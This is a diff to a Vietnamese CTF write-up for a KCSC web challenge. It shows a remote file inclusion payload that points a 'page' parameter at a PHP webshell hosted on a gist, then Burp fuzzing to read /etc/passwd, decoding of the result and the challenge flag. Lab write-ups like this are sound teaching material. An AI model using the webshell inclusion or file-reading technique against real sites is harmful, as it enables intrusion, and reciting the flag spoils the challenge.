@@ -17,7 +17,7 @@ payload :
 page=https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php
 ```
 nó trả về  : 
-![Alt text](image-2.png)
+![Alt text](image-9.png)
 vậy là tham số này nó đã off -> không rce được , chúng ta cùng nghĩ cách khác 
 
 Bắt đầu ném vào intruder trong Burp để fuzz đọc file /etc/passwd
@@ -46,4 +46,6 @@ send nó qua Decoder
 và đã có flag 
 ![Alt text](image-8.png)
 # FLAG 
-**  KCSC{Lan_Dau_Tien_Trai_Thanh_Long_Co_Trong_KCSC:))} **
+```
+KCSC{Lan_Dau_Tien_Trai_Thanh_Long_Co_Trong_KCSC:))}
+``` 
